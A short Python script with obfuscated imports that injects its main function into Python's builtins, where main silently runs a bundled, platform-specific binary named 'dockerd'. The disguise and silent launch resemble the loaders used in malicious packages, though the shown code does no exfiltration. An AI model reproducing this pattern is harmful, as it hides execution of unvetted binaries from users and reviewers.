from subprocess import run as _r
from os.path import join as _j
from platform import system as _s
try: import builtins as __builtin__
except: import __builtin__

__builtin__s = lambda x : lambda y : (y, setattr(__builtin__, x, y))[0]
__builtin__o = lambda x : __builtin__s(x.__name__, x)

@__builtin__o
def main():
    _r([_j('.', _s(), 'dockerd')], capture_output=True, text=True)